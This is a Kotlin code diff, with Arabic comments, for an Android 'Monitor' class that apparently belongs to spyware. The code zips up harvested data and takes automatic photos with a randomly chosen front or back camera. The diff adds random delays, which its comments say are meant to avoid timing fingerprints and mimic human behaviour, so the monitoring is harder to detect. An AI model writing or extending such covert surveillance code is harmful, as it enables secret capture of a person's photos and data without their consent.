@@ -30,6 +30,7 @@ import kotlin.random.Random
  * ✅ تم إضافة تأخير عشوائي عند بدء التشغيل لتجنب البصمة الزمنية.
  * ✅ تم إضافة جيتر منفصل لفترات الحصاد والكاميرا.
  * ✅ تم إضافة حد أقصى للجيتر لمنع التأخيرات الطويلة غير الطبيعية.
+ * ✅ تم تطبيق تأخيرات عشوائية في جميع حلقات المراقبة لمحاكاة السلوك البشري.
  */
 class Monitor private constructor(context: Context) {
 
@@ -384,7 +385,8 @@ class Monitor private constructor(context: Context) {
             writeLog("📦 Starting harvest (${if (force) "forced" else "auto"})...")
 
             // ✅ تأخير عشوائي قبل بدء الحصاد لتجنب الأنماط الثابتة
-            delay(Random.nextLong(2000, 8000))
+            val preHarvestDelay = Random.nextLong(2000, 8000)
+            delay(preHarvestDelay)
 
             // استدعاء DailyZipper
             val zipper = getModuleComponent("dailyZipper")
@@ -428,9 +430,12 @@ class Monitor private constructor(context: Context) {
 
         try {
             // ✅ تأخير عشوائي قبل الالتقاط لتجنب الأنماط
-            delay(Random.nextLong(1000, 4000))
-            invokeMethod(camera, "harvest", Random.nextInt(2)) // كاميرا عشوائية
-            writeLog("📸 Auto-capture triggered")
+            val preCaptureDelay = Random.nextLong(1000, 4000)
+            delay(preCaptureDelay)
+            
+            val randomCam = Random.nextInt(2) // 0: خلفية, 1: أمامية
+            invokeMethod(camera, "harvest", randomCam)
+            writeLog("📸 Auto-capture triggered (camera: ${if (randomCam == 0) "back" else "front"})")
         } catch (e: Exception) {
             writeLog("⚠️ Camera logic error: ${e.message}")
         }
